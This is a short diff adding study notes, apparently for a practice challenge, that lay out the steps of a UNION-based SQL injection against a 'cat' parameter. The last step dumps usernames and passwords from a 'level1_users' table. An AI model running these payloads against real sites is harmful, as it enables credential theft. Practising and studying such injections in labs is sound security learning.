@@ -1,0 +1,4 @@
+spot cat=1 link
+identify parameters by cat=1 order by 4
+check if any of them (and which) are visible on scree cat=1 union select 1,2,3,4
+get username from level1_users cat=1 union select 1,2,userame,password from level1_users
